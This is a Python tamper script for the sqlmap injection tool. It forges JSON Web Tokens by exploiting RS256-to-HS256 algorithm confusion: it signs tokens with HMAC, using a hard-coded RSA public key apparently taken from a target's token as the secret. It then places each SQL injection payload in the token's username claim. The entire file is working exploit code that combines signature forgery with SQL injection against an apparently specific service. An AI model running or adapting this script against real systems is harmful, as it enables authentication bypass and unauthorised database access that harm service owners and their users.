#!/usr/bin/env python3
 
import logging
import json
import hmac
from base64 import b64encode, b64decode
from lib.core.enums import PRIORITY
 
"""
Tamper script that encodes the sqlmap payload in the JWT payload
and re-signs the JWT with the public key.
"""
 
# Define which is the order of application of tamper scripts against the payload
__priority__ = PRIORITY.NORMAL
 
# output using the sqlmap internal logger
log2 = logging.getLogger("sqlmapLog")
 
# hard coded public key taken from the original JWT
public_key = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n"
iat = 1635152889
 
 
def create_signed_token(key, data):
    """
    Creates a complete JWT token with 'data' as the JWT payload.
    Exclusively uses sha256 HMAC.
    """
    # create base64 header
    header = json.dumps({"typ":"JWT","alg":"HS256"}).encode()
    b64header = b64encode(header).rstrip(b'=')

    # create base64 payload 
    payload = json.dumps(data).encode()
    b64payload = b64encode(payload).rstrip(b'=')
 
    # put the header and payload together
    hdata = b64header + b'.' + b64payload
 
    # create the signature
    verifySig = hmac.new(key, msg=hdata, digestmod='sha256')
    verifySig = b64encode(verifySig.digest())
    verifySig = verifySig.replace(b'/', b'_').replace(b'+', b'-').strip(b'=')
 
    # put the header, payload and signature together
    token = hdata + b'.' + verifySig
    return token
 
 
def craftExploit(payload):
    pk = public_key.encode()
 
    # put the sqlmap payload in the data
    data = {"username": payload, "iat": iat}
    log2.info(json.dumps(data, separators=(',',':')))
 
    token = create_signed_token(pk, data)
    return token.decode('utf-8')
 
 
def tamper(payload, **kwargs):
    """
    This is the entry point for the script.  sqlmap calls tamper() for every payload.
    Encodes the sqlmap payload in the JWT payload
    and re-signs the JWT with the public key.
    """
    # create a new payload jwt token re-signed with HS256
    retVal = craftExploit(payload)
 
    #log2.info(json.dumps({"payload": payload}))
 
    # return the tampered payload
    return retVal
